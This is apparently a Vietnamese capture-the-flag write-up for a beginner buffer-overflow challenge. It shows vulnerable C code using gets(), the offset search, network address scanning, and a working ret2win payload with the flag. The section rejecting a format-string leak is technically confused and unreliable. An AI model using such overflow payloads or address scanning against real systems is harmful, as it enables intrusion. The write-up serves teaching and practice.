# Kuiper Belt Relay Core

**Event:** CSS CTF 2026  
**Category:** pwn  
**Difficulty:** Beginner (50 points)

## Đề bài

Service echo đơn giản, gọi hàm `vuln()` với `gets(buffer[64])`. Hàm `win()` tồn tại nhưng chưa bao giờ được gọi. Mục tiêu là tràn buffer để override return address, nhảy vào `win()` và nhận flag.

Source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

## Phân tích ban đầu

- Buffer: `char buffer[64]` tại offset 0.
- Scanning boundary qua output termination: `"A"*71` → có `Goodbye!`, `"A"*72` → không có `Goodbye!`.
- Return address nằm tại **offset 72** (64 byte buffer + 8 byte saved RBP).
- Binary là x86-64 non-PIE (address scan thành công trong range 0x40xxxx).

## Các hướng đã loại

### Stack leak qua printf format string

Thử nghiệm: gửi payload dạng `b"A"*n + b"%s%s%s..."` để đọc memory sau buffer.

Kết quả: không thấy địa chỉ có ý nghĩa. Investigation cho thấy `gets()` tự động viết `\x00` terminator ngay sau dữ liệu input. Với address 64-bit bắt đầu bằng 0x40, byte thấp nhất là 0x16 (cho ví dụ), việc ghi byte thấp trước khiến `gets()` inject NUL chính xác ở LSB(ret) → chuỗi bị truncate tại chỗ.

Kết luận: không thể dùng stack leak để tìm địa chỉ `win()`. Cần oracle-based scanning trực tiếp trên service.

## Chuỗi khai thác

**Bước 1 — Xác định boundary của return address.**

Gửi payload với độ dài tăng dần, quan sát response để xác định khi nào `Goodbye!` biến mất:

```
"A"*64 → echoes correctly + Goodbye!
"A"*71 → echoes correctly + Goodbye!
"A"*72 → echoes only \n (no Goodbye!)
```

Return address tại offset 72.

**Bước 2 — Oracle-based scanning để tìm địa chỉ `win()`.**

Vì không có binary để tính static address, scan trực tiếp server trong range `.text`: 0x401000–0x401500.

Payload cho mỗi candidate: `b"A"*72 + low_bytes(addr)` (little-endian, truncate tại NUL).

Oracle: response chứa "hijacked" hoặc "CSSCTF".

Hit tại addr: **0x401216**.

**Bước 3 — Construct exploit payload.**

Address 0x401216 < 0x1000000, nên chỉ cần 3 byte: `0x16 0x12 0x40`.

Final payload: `b"A"*72 + b"\x16\x12\x40"`.

**Bước 4 — Kiểm chứng.**

Chạy thử 3 lần, tất cả đều thành công.

## Flag

```
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Reproduce

```bash
python exploit.py
```

Output:
```
This program is a simple echo service.
Enter your message: You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Files

- **exploit.py**: Script khai thác chính
- **de.png**: Ảnh đề bài gốc từ thẻ challenge
- **analysis/**: Scripts khám phá từng giai đoạn
